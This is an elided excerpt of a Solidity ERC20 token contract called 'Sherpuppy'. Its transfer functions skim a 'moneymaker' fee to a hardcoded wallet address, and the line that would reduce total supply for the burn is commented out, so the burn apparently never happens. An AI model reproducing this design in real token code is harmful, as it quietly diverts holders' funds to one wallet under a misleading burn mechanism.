...
contract Sherpuppy is ERC20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;

  string constant tokenName = "Sherpuppy";
  string constant tokenSymbol = "SHP";
  ...
  function transfer(address to, uint256 value) public returns (bool) {
    ...
    uint256 moneymaker = tokensToBurn+tokensToReward;
    uint256 tokensToTransfer = value.sub(moneymaker);
   ...
   // _totalSupply = _totalSupply.sub(tokensToBurn);
    ...
    emit Transfer(msg.sender, 0x2ABF7f5b009758b28C61c7e10784cF56c7a34351, tokensToReward);
    return true;
  }
  ...
  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    ...
    emit Transfer(from, 0x2ABF7f5b009758b28C61c7e10784cF56c7a34351, tokensToReward);
